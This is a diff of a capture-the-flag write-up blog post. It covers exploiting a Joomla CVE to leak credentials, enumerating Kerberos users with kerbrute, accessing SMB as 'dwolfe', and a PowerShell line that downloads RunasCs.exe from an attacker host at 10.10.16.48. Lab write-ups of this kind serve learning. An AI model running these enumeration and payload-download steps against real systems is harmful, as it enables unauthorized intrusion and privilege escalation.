@@ -71,6 +71,13 @@ look at some exploit file we can see it with send request to some uri and retrie
 ![image](https://github.com/vanatka10/myblog/assets/126310360/7abb26a3-441a-466b-91ad-d538bbf8b461)
 
 https://github.com/Acceis/exploit-CVE-2023-23752.git
+
+![image](https://github.com/vanatka10/myblog/assets/126310360/732f64ad-ec0f-4d26-8215-0f1ea55190dc)
+
+We have some Credentials but i can't login with these :3 . probably password of another user?
+kerberos port open so i use kerbrute discover user.  
+i got some username, after a few tries and fuzz finally i have working username .It is 'dwolfe' but it just use in smb
+
 ### smb
 ```
 smbclient //10.129.198.153/SOC\ Analysis  -U 'dwolfe'
@@ -101,3 +108,7 @@ powershell -c wget 10.10.16.48:9000/RunasCs.exe -o r.exe
 
 
 ```
+![image](https://github.com/vanatka10/myblog/assets/126310360/24571f7e-886b-4cf1-be73-fc13573affc1)
+
+get the flag
+![image](https://github.com/vanatka10/myblog/assets/126310360/c356cb70-a650-4ab6-a65b-36748dbc2931)
